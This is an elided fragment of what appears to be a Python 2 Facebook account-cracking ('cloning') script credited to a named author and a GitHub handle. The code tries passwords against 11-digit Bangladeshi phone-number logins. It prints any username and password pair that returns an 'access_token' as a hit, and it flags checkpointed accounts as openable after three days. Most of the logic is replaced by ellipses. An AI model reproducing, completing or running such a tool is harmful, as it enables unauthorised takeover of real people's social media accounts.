...
psb('\x1b[1;32mBANGLADESH MEHEDI 11 DIGIT CLONING START PLEASE WAIT ..........')
...
def menu():
    ...
    print 'FACEBOOK : MEHEDI HASAN RONY'

    print 'GITHUB     : github.com/MEHEDI-404'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[MEHEDI-OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;93m[MEHEDI-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
